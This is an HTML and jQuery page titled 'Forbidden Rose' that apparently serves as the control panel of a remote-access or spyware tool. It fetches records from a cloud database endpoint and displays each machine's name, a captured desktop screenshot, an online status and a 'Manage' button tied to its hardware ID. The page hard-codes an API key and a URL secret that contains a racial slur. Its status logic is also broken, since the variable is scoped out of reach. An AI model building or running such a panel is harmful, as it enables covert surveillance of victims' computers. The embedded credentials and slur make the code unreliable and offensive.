<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forbidden Rose</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="container position-relative">
        <h1 class="my-4" style="text-align-last: center;">Forbidden Rose</h1>
        <div id="desktop-list" class="row"></div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
    <script>
        $(document).ready(function () {
            const url = 'https://corsproxy.io/?' + encodeURIComponent('https://us-central1.gcp.data.mongodb-api.com/app/application-0-sorpnwy/endpoint/ForbiddenRose?secret=ForbiddenRose1337SecretNigga');
            $.ajax({
                type: "POST",
                url: url,
                headers: {
                    "Accept": "application/json",
                    "apiKey": "PjbcURPX7WtAEBIrNxKgJ5C9XTNunLUIKPlGdtA4fewzyMbKW72FvX8mOeLwxOzI",
                },
                contentType: "application/json",
                success: function (response) {
                    if (response.status === "success") {
                        response.data.forEach((item, index) => {
                            let timestamp = new Date(item.timestamp);
                            let currentTimestamp = new Date();
                            let diff = Math.abs(currentTimestamp - timestamp) / 1000;
                            if (diff > 31) {
                                let online = false;
                            } else {
                                let online = true;
                            }
                            let Screenshot = item.screenshot;
                            let Image = document.createElement("img");
                            Image.src = "data:image/png;base64," + Screenshot;
                            Image.style.width = "100%";
                            Image.style.height = "auto";
                            Image.style.borderRadius = "10px";
                            Image.style.marginBottom = "20px";
                            let html = `
                                <div class="col-md-4">
                                    <div class="card mb-4">
                                        <div class="card-header">
                                            ${item.computer_name}
                                        </div>
                                        <div class="card-body">
                                            ${Image.outerHTML}
                                            <p>Status: <span class="badge ${online ? "bg-success" : "bg-danger"}">${online ? "Online" : "Offline"}</span></p>
                                            <button class="btn btn-primary manage-btn" data-hwid="${item.hwid}">Manage</button>
                                        </div>
                                    </div>
                                </div>
                            `;
                            $("#desktop-list").append(html);
                        });
                    } else {
                        alert("An error occurred while fetching the data.");
                    }
                },
                error: function () {
                    alert("An error occurred while fetching the data.");
                }
            });
        });
    </script>
</body>

</html>
